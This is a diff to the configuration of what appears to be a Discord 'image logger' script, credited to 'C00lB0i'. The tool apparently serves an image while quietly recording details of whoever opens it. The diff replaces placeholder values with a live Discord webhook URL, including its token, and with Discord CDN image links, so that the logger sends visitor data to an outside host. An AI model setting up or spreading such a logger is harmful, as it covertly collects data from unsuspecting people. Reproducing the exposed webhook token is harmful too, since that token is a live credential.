@@ -12,8 +12,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1477701271254208575/cp0BL3qjzl5OOCsvTJU_BJrtn4UtVNFwgQExgvh2WZ4l4DI6AoThC0xSjxL8VL26NyAK",
+    "image": "https://cdn.discordapp.com/attachments/1473350954479911125/1477703026557976747/image.png?ex=69a5b9af&is=69a4682f&hm=ec7909c2561077ef2e6ddbe0d3cbd182532487b12f87cfd56949118e07bffdc6", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "page": "https://cdn.discordapp.com/attachments/1473350954479911125/1477703026557976747/image.png?ex=69a5b9af&is=69a4682f&hm=ec7909c2561077ef2e6ddbe0d3cbd182532487b12f87cfd56949118e07bffdc6" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
